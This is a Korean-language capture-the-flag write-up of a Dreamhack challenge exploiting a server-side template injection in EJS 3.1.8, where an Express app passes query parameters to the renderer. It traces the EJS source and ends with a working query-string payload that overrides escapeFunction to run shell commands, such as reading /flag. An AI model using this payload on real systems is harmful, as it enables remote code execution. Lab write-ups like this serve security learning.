# ejs@3.1.8
https://dreamhack.io/wargame/challenges/675
## Description
find bug and exploit !

# Exploit
## Find bug
```js
const express = require('express')
const app = express()
const port = 3000

app.set('view engine', 'ejs');

app.get('/', (req,res) => {
    res.render('index', req.query);
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```
client에게 EJS렌더링에 대해 무제한 엑세스 권한을 부여해 취약점이 발생한다.
https://github.com/mde/ejs/blob/main/SECURITY.md
<br><br>

### ejs@3.1.6
```js
if (data.settings) {
        // Pull a few things from known locations
        if (data.settings.views) {
          opts.views = data.settings.views;
        }
        if (data.settings['view cache']) {
          opts.cache = true;
        }
        viewOpts = data.settings['view options'];
        if (viewOpts) {
          utils.shallowCopy(opts, viewOpts);
        }
      }
```
`opts`에 원하는 값을 넣을 수 있다.
<br><br>

```js
if (opts.outputFunctionName) {
  if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {
    throw new Error('outputFunctionName is not a valid JS identifier.');
  }
  prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```
즉 `opts.outputFunctionName`을 덮어쓸수 있었다.    
https://eslam.io/posts/ejs-server-side-template-injection-rce/

###  > ejs@3.1.6
```js
compile: function (){

    // ~~~

    // Line 580
    var escapeFn = opts.escapeFunction;

    // ~~~

    // Line 591
    if (opts.outputFunctionName){
        if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) 
          throw new Error('outputFunctionName is not a valid JS identifier.');
      
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
    }

    // ~~~

    // Line 636
    if (opts.client) {
      src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
      if (opts.compileDebug) {
        src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
      }
    }

    // ~~~
}
```
https://github.com/mde/ejs/blob/5b13088c6de0bff1ce5c6ff2eef7ee7eff0d6f3e/lib/ejs.js#L571
<br><br>

```js
if (opts.outputFunctionName){
    if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) 
      throw new Error('outputFunctionName is not a valid JS identifier.');
  
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```
유저가 직접 사용가능한 `opts.escapeFunction`같은 함수는 `if (!_JS_IDENTIFIER.test(opts.outputFunctionName))`으로 검사한다. 
<br><br>

```js
var escapeFn = opts.escapeFunction;
```
하지만 `opts.escapeFunction`은 이미 `escapeFn`에 저장되어있다.
<br><br>

```js
if (opts.client) {
  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
  if (opts.compileDebug) {
    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
  }
}
```
`opts.client`가 `true`라면 컴파일엔 `escapeFn.toString()`가 담긴다.

### Payload
`?settings[view options][client]=true&settings[view options][escapeFunction]='x';return process.mainModule.require('child_process').execSync("calc");`
<br><br>

## Exploit
`http://host3.dreamhack.games:<PORT>/?settings[view options][client]=true&settings[view options][escapeFunction]='x';return process.mainModule.require('child_process').execSync("cat /flag");`
